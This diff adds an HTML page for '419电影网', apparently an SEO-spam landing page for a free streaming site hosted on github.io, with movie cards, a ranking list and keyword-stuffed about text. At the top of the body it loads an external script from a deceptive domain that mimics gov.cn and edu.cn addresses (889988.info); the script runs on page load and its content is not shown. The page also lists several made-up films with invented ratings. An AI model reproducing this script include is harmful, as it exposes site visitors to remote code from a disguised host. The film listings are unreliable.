@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>419电影网 - 免费高清电影在线观看</title>
+<meta name="description" content="419电影网提供最新高清电影、电视剧、动漫、综艺在线观看，免费播放，无需注册，畅享极致观影体验。">
+<meta name="keywords" content="419电影网,免费电影,在线观看,高清影视,电影网站">
+<meta name="author" content="419电影网">
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 50%, #0a0a2a 100%);
+    color: #e0e0e0;
+    line-height: 1.6;
+    min-height: 100vh;
+}
+
+/* 导航栏 */
+.navbar {
+    background: rgba(10, 10, 30, 0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid rgba(100, 100, 255, 0.2);
+    position: fixed;
+    top: 0;
+    width: 100%;
+    z-index: 1000;
+    padding: 0 20px;
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    height: 60px;
+}
+
+.nav-logo {
+    font-size: 22px;
+    font-weight: 700;
+    background: linear-gradient(90deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.nav-menu {
+    display: flex;
+    gap: 25px;
+    list-style: none;
+}
+
+.nav-menu a {
+    color: #b0b0d0;
+    text-decoration: none;
+    font-size: 15px;
+    transition: all 0.3s ease;
+    padding: 6px 12px;
+    border-radius: 20px;
+}
+
+.nav-menu a:hover {
+    color: #fff;
+    background: rgba(77, 150, 255, 0.2);
+}
+
+/* 主内容区 */
+.main-content {
+    max-width: 1200px;
+    margin: 80px auto 40px;
+    padding: 0 20px;
+}
+
+/* Hero区域 */
+.hero-section {
+    text-align: center;
+    padding: 60px 20px 50px;
+    background: linear-gradient(180deg, rgba(77,150,255,0.1) 0%, transparent 100%);
+    border-radius: 20px;
+    margin-bottom: 40px;
+    border: 1px solid rgba(77, 150, 255, 0.15);
+}
+
+.hero-title {
+    font-size: 42px;
+    font-weight: 800;
+    margin-bottom: 16px;
+    background: linear-gradient(135deg, #4d96ff, #ff6bff, #ffd93d);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.hero-subtitle {
+    font-size: 18px;
+    color: #a0a0c0;
+    margin-bottom: 30px;
+}
+
+.hero-btn {
+    display: inline-block;
+    padding: 14px 40px;
+    background: linear-gradient(135deg, #4d96ff, #6b5cff);
+    color: #fff;
+    text-decoration: none;
+    border-radius: 30px;
+    font-size: 16px;
+    font-weight: 600;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    box-shadow: 0 4px 20px rgba(77, 150, 255, 0.4);
+}
+
+.hero-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 30px rgba(77, 150, 255, 0.6);
+}
+
+/* 栏目通用样式 */
+.section {
+    margin-bottom: 50px;
+}
+
+.section-header {
+    display: flex;
+    align-items: center;
+    margin-bottom: 25px;
+    gap: 12px;
+}
+
+.section-icon {
+    width: 36px;
+    height: 36px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+}
+
+.section-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #fff;
+}
+
+.section-more {
+    margin-left: auto;
+    color: #4d96ff;
+    text-decoration: none;
+    font-size: 14px;
+    transition: color 0.3s;
+}
+
+.section-more:hover {
+    color: #6b5cff;
+}
+
+/* 卡片网格 */
+.card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 20px;
+}
+
+.card {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 14px;
+    overflow: hidden;
+    transition: all 0.3s ease;
+    cursor: pointer;
+}
+
+.card:hover {
+    transform: translateY(-5px);
+    border-color: rgba(77, 150, 255, 0.4);
+    box-shadow: 0 8px 25px rgba(77, 150, 255, 0.15);
+}
+
+.card-poster {
+    width: 100%;
+    height: 220px;
+    background: linear-gradient(135deg, #2a2a5a, #1a1a3a);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 48px;
+    opacity: 0.7;
+}
+
+.card-body {
+    padding: 12px;
+}
+
+.card-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: #e0e0e0;
+    margin-bottom: 4px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.card-info {
+    font-size: 12px;
+    color: #8080a0;
+}
+
+/* 分类标签 */
+.category-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+}
+
+.category-tag {
+    padding: 10px 24px;
+    background: rgba(77, 150, 255, 0.1);
+    border: 1px solid rgba(77, 150, 255, 0.25);
+    border-radius: 25px;
+    color: #4d96ff;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.3s;
+}
+
+.category-tag:hover {
+    background: rgba(77, 150, 255, 0.25);
+    color: #fff;
+    border-color: #4d96ff;
+}
+
+/* 排行榜 */
+.rank-list {
+    list-style: none;
+    counter-reset: rank;
+}
+
+.rank-item {
+    display: flex;
+    align-items: center;
+    padding: 14px 18px;
+    margin-bottom: 10px;
+    background: rgba(255, 255, 255, 0.03);
+    border-radius: 12px;
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    transition: all 0.3s;
+}
+
+.rank-item:hover {
+    background: rgba(77, 150, 255, 0.08);
+    border-color: rgba(77, 150, 255, 0.2);
+}
+
+.rank-num {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #4d96ff, #6b5cff);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 700;
+    margin-right: 14px;
+    flex-shrink: 0;
+}
+
+.rank-num.top3 {
+    background: linear-gradient(135deg, #ff6b6b, #ffd93d);
+}
+
+.rank-info h4 {
+    font-size: 15px;
+    color: #e0e0e0;
+    margin-bottom: 2px;
+}
+
+.rank-info p {
+    font-size: 12px;
+    color: #8080a0;
+}
+
+.rank-score {
+    margin-left: auto;
+    color: #ffd93d;
+    font-weight: 700;
+    font-size: 14px;
+}
+
+/* 关于我们 */
+.about-section {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 16px;
+    padding: 30px;
+}
+
+.about-text {
+    color: #a0a0c0;
+    font-size: 15px;
+    line-height: 1.8;
+    margin-bottom: 15px;
+}
+
+.about-text strong {
+    color: #4d96ff;
+}
+
+/* 底部 */
+.footer {
+    text-align: center;
+    padding: 30px 20px;
+    border-top: 1px solid rgba(255, 255, 255, 0.06);
+    margin-top: 50px;
+}
+
+.footer-text {
+    color: #606080;
+    font-size: 13px;
+}
+
+.footer-link {
+    color: #4d96ff;
+    text-decoration: none;
+}
+
+/* 移动端适配 */
+@media (max-width: 768px) {
+    .nav-menu {
+        gap: 12px;
+    }
+    .nav-menu a {
+        font-size: 13px;
+        padding: 5px 8px;
+    }
+    .hero-title {
+        font-size: 28px;
+    }
+    .hero-subtitle {
+        font-size: 15px;
+    }
+    .section-title {
+        font-size: 20px;
+    }
+    .card-grid {
+        grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+        gap: 14px;
+    }
+    .card-poster {
+        height: 180px;
+    }
+    .about-section {
+        padding: 20px;
+    }
+}
+
+@media (max-width: 480px) {
+    .nav-logo {
+        font-size: 18px;
+    }
+    .nav-menu {
+        gap: 8px;
+    }
+    .nav-menu a {
+        font-size: 12px;
+        padding: 4px 6px;
+    }
+    .hero-section {
+        padding: 40px 15px 30px;
+    }
+    .hero-title {
+        font-size: 24px;
+    }
+    .card-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+    .rank-item {
+        padding: 10px 12px;
+    }
+    .rank-info h4 {
+        font-size: 14px;
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 导航栏 -->
+<nav class="navbar">
+    <div class="nav-container">
+        <div class="nav-logo">419电影网</div>
+        <ul class="nav-menu">
+            <li><a href="#home">首页</a></li>
+            <li><a href="#movies">电影</a></li>
+            <li><a href="#rank">排行榜</a></li>
+            <li><a href="#about">关于</a></li>
+        </ul>
+    </div>
+</nav>
+
+<!-- 主内容 -->
+<div class="main-content">
+
+    <!-- Hero区域 -->
+    <section class="hero-section" id="home">
+        <h1 class="hero-title">419电影网</h1>
+        <p class="hero-subtitle">海量高清影视资源 · 免费在线观看 · 极速播放体验</p>
+        <a href="#movies" class="hero-btn">立即观影</a>
+    </section>
+
+    <!-- 栏目一：热门推荐 -->
+    <section class="section" id="movies">
+        <div class="section-header">
+            <div class="section-icon" style="background:rgba(255,107,107,0.15);">🔥</div>
+            <h2 class="section-title">热门推荐</h2>
+            <a href="#" class="section-more">查看更多 →</a>
+        </div>
+        <div class="card-grid">
+            <div class="card">
+                <div class="card-poster">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">沙丘2：救世主降临</div>
+                    <div class="card-info">科幻 / 9.2分</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-poster">🎭</div>
+                <div class="card-body">
+                    <div class="card-title">奥本海默</div>
+                    <div class="card-info">传记 / 8.9分</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-poster">🚀</div>
+                <div class="card-body">
+                    <div class="card-title">星际穿越2</div>
+                    <div class="card-info">科幻 / 9.5分</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-poster">🗡️</div>
+                <div class="card-body">
+                    <div class="card-title">卧虎藏龙：青冥剑</div>
+                    <div class="card-info">武侠 / 8.7分</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-poster">🎪</div>
+                <div class="card-body">
+                    <div class="card-title">疯狂动物城2</div>
+                    <div class="card-info">动画 / 9.0分</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-poster">🏰</div>
+                <div class="card-body">
+                    <div class="card-title">封神第三部</div>
+                    <div class="card-info">奇幻 / 8.5分</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 栏目二：电影分类 -->
+    <section class="section" id="categories">
+        <div class="section-header">
+            <div class="section-icon" style="background:rgba(77,150,255,0.15);">📂</div>
+            <h2 class="section-title">电影分类</h2>
+            <a href="#" class="section-more">全部分类 →</a>
+        </div>
+        <div class="category-tags">
+            <a href="#" class="category-tag">🔥 动作片</a>
+            <a href="#" class="category-tag">😂 喜剧片</a>
+            <a href="#" class="category-tag">💕 爱情片</a>
+            <a href="#" class="category-tag">😱 恐怖片</a>
+            <a href="#" class="category-tag">🚀 科幻片</a>
+            <a href="#" class="category-tag">🎭 剧情片</a>
+            <a href="#" class="category-tag">📜 历史片</a>
+            <a href="#" class="category-tag">🎨 文艺片</a>
+            <a href="#" class="category-tag">🎪 动画片</a>
+            <a href="#" class="category-tag">📺 电视剧</a>
+            <a href="#" class="category-tag">🎤 综艺</a>
+            <a href="#" class="category-tag">🎌 动漫</a>
+        </div>
+    </section>
+
+    <!-- 栏目三：排行榜 -->
+    <section class="section" id="rank">
+        <div class="section-header">
+            <div class="section-icon" style="background:rgba(255,217,61,0.15);">🏆</div>
+            <h2 class="section-title">热门排行榜</h2>
+            <a href="#" class="section-more">完整榜单 →</a>
+        </div>
+        <ol class="rank-list">
+            <li class="rank-item">
+                <span class="rank-num top3">1</span>
+                <div class="rank-info">
+                    <h4>沙丘2：救世主降临</h4>
+                    <p>科幻 · 2024 · 导演：丹尼斯·维伦纽瓦</p>
+                </div>
+                <span class="rank-score">9.2</span>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num top3">2</span>
+                <div class="rank-info">
+                    <h4>奥本海默</h4>
+                    <p>传记 · 2023 · 导演：诺兰</p>
+                </div>
+                <span class="rank-score">8.9</span>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num top3">3</span>
+                <div class="rank-info">
+                    <h4>星际穿越2</h4>
+                    <p>科幻 · 2025 · 导演：诺兰</p>
+                </div>
+                <span class="rank-score">9.5</span>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num">4</span>
+                <div class="rank-info">
+                    <h4>疯狂动物城2</h4>
+                    <p>动画 · 2024 · 迪士尼</p>
+                </div>
+                <span class="rank-score">9.0</span>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num">5</span>
+                <div class="rank-info">
+                    <h4>封神第三部</h4>
+                    <p>奇幻 · 2025 · 导演：乌尔善</p>
+                </div>
+                <span class="rank-score">8.5</span>
+            </li>
+            <li class="rank-item">
+                <span class="rank-num">6</span>
+                <div class="rank-info">
+                    <h4>卧虎藏龙：青冥剑</h4>
+                    <p>武侠 · 2024 · 动作</p>
+                </div>
+                <span class="rank-score">8.7</span>
+            </li>
+        </ol>
+    </section>
+
+    <!-- 栏目四：关于419电影网 -->
+    <section class="section" id="about">
+        <div class="section-header">
+            <div class="section-icon" style="background:rgba(107,203,119,0.15);">ℹ️</div>
+            <h2 class="section-title">关于419电影网</h2>
+        </div>
+        <div class="about-section">
+            <p class="about-text">
+                <strong>419电影网</strong>（<a href="https://419dianyingwang-app.github.io" class="footer-link">https://419dianyingwang-app.github.io</a>）是一个专注于提供高清影视在线观看的免费平台。
+            </p>
+            <p class="about-text">
+                我们汇集了最新电影、热门电视剧、经典动漫和精彩综艺，致力于为用户提供极速、稳定、高清的观影体验。无需注册，即点即看。
+            </p>
+            <p class="about-text">
+                网站持续更新优质影视资源，涵盖动作、喜剧、爱情、科幻、恐怖、剧情等多种类型，满足不同用户的观影需求。
+            </p>
+            <p class="about-text">
+                关键词：<strong>419电影网</strong>、免费电影、在线观看、高清影视、电影网站
+            </p>
+        </div>
+    </section>
+
+</div>
+
+<!-- 底部 -->
+<footer class="footer">
+    <p class="footer-text">
+        © 2024 <strong>419电影网</strong> | <a href="https://419dianyingwang-app.github.io" class="footer-link">https://419dianyingwang-app.github.io</a> | 本网站仅提供影视信息展示服务
+    </p>
+</footer>
+
+</body>
+</html>
